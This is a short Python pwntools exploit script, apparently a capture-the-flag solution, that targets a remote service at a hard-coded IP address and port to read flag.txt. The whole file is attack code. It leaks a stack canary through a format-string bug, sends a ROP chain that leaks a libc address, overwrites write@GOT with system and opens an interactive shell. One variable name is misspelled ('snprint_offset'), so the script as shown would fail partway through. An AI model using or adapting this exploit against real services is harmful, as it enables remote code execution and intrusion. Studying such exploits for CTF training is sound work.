#!/usr/bin/python3

from pwn import *

# target: flag.txt @ 104.131.58.52:9999

#After ROPgadget and disassembling the functions in GDB
write_plt = 0x08049140
write_got = 0x804c028
pop_pop_pop_ret = 0x080493f1
read_plt = 0x080490d0
ed_string = 0x804831f
snprintf_offset = 0x53e10
snprintf_got = 0x804c02c

#Offsets from libc6-i386_2.31-0ubuntu9.2_amd64
offset___libc_start_main_ret = 0x1eee5
offset_system = 0x00045420
offset_dup2 = 0x000f5250
offset_puts = 0x00071290
offset_read = 0x000f45d0
offset_write = 0x000f4670
offset_str_bin_sh = 0x18f352

def main():
    p = remote("104.131.58.52", 9999)

    p.sendline("%29$x")
    canary = p.recv()
    log.info("Canary Value: %s" % canary)

    # create your payload
    payload = b"A" * 100 + p32(int(canary,16)) + b"A" * 12
    payload += p32(write_plt)
    payload += p32(pop_pop_pop_ret)
    payload += p32(1)
    payload += p32(snprintf_got)
    payload += p32(4)
    payload += p32(read_plt)
    payload += p32(pop_pop_pop_ret)
    payload += p32(0)
    payload += p32(write_got)
    payload += p32(4)

    #Stage 4
    payload += p32(write_plt)
    payload += p32(0xdeadbeef)
    payload += p32(ed_string)
    p.send(payload)

    payload = p32(snprintf_got) + b"%4$s\n"
    p.send(payload)

    #Stage 1
    p.recv(1048)
    leak_data = p.recv(4)
    snprintf_libc = u32(leak_data)
    log.info("snprintf@libc: 0x%x", snprintf_libc)

    #Stage 2
    libc_start_addr = snprintf_libc - snprint_offset
    system_libc = libc_start_addr + offset_system
    log.info("system@libc addr: 0x%x", system_libc)

    #Stage 3
    p.send(p32(system_libc))

    # Change to interactive mode
    p.interactive()

if __name__ == "__main__":
    main()
